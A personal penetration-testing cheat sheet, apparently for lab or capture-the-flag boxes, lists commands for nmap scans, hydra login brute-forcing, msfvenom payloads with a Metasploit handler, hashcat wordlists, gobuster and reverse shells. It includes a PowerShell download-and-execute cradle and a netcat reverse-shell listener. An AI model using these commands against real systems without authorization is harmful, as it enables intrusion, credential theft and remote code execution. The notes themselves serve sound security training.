# Random notes that I have not filed yet

## Standard nmap scan
`sudo nmap -sC -sV -oA nmap/(box name) (IP)`

## Screenshots
### Howto
In Kali, `CTRL+SHIFT+PRINT SCREEN` brings up a target window, you can then use this to draw a rectangle around an area and take a picture. This picture is saved to your clipboard, which you can paste inside or outside of your VM
### Screenshot access when obtained
Windows: `hostname; whoami; ipconfig`

Linux: `hostname; whoami; ip a`

## Setup a simple web server
`python -m SimpleHTTPServer`

## Encoding file to remove bad characters, and copy to clipboard
`cat (filename) | iconv -t UTF-16LE | base64 -w 0 | xclip -selection clipboard`

Change `UTF-16LE` to `UTF-8` for Unix

## HTTP login pages
`hydra -C /usr/share/seclists/Passwords/Default-Credentials/(chosen file) -s (port) (IP) http-get (subdirectory)`

## MSFVenom
### List payloads
`msfvenom -l payloads`
### List formats
`msfvenom -l formats`
### Create payload
`msfvenom -p (payload) LHOST=(IP) LPORT=(port) -f (format) -o (output filename)`

## Setup handler
In Metasploit: 

`use exploit/multi/handler`

`set payload (selected payload)`

`set LHOST tun0`

`set LPORT (port)`

`exploit -j` to run in background

## Check sessions in Metasploit
`sessions -i 1`

## Wordlists
### How to make nice wordlists
`hashcat --force --stdout -r /usr/share/hashcat/rules/best64.rule (original password list you have) > password.lst`

## Decompilers
### DNSpy
Recommended for .NET

## Linux shell
### `!!`
Reruns previous command
### `$_`
Pulls out last argument from previous command
### `!$`
Pulls out last word from previous command (not quite the same as `$_`)

## Windows shell
### `allinfo`
Windows version of `ls -lah`
### `type`, `gc`
Windows version of `cat`
### `gci`
Shorthand for `get-childitem`, `gci -Hidden` is like `ls -a`
### Running files
Run files with `.\(filename)`
### Download from Windows shell
`IEX(New-Object Net.WebClient).downloadString('http://(IP/HOSTNAME)')`

## OS typing by TTL
Windows has a default of a 128 TTL, Unix has 64?

## Finding web server subdirectories
`gobuster dir -u '(IP)' -x (format) -w /usr/share/wordlists/dirbuster/(chosen wordlist) -o (output file)`

## Reverse shells
### Where can they be found?
On Kali, find most in `/opt/nishang/Shells/`, `/usr/share/laudanum/php/`

Plenty at [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). Netcat is fairly reliable, bash also works well
### Setup a listener for a reverse shell
`nc -lvnp 8081`

### Convert into a real shell
`python -c 'import pty;pty.spawn("/bin/bash")'`

## Searchsploit
Path for Kali is `/usr/share/exploitdb/exploits/`

## evil-winrm
### `upload`
Uploads a file from your current working directory

## DNS Servers
Typically running kerberos (:88), Windows RPC (:135), and ldap (:389), possibilty SMB (:445)

## tmux
When a bash command finishes running in a pane in tmux, it'll change the name from something like “nmap” to “bash”
